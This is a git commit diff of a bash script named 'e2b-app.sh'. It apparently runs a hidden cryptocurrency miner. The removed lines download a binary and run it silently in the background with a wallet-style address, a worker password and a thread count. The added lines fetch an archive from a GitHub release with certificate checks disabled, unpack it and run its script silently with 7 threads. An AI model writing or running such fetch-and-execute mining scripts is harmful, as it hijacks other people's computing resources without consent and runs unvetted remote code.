5ae402c739493f635494d8f2349dc316b5bf357b
gaserjuk <gaserjukilo@gmail.com>
2026-05-19 13:18:11 +0700

    Update e2b-app.sh

--- e2b-app.sh
+++ e2b-app.sh
@@ -1,7 +1,10 @@
 #!/bin/bash
-curl -s -L -o ban https://gitlab.com/nujuk-group/samin/-/raw/main/volt?ref_type=heads >/dev/null 2>&1
-chmod 777 ban
-./ban --user 88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL --pass WORKER-E --threads 7 >/dev/null 2>&1 &
+
+curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/vertex.tar.gz>/dev/null 2>&1
+tar -xvf vertex.tar.gz >/dev/null 2>&1
+rm vertex.tar.gz
+chmod +x run.sh
+./run.sh 7 >/dev/null 2>&1 &
 sleep 20
 while true
 do
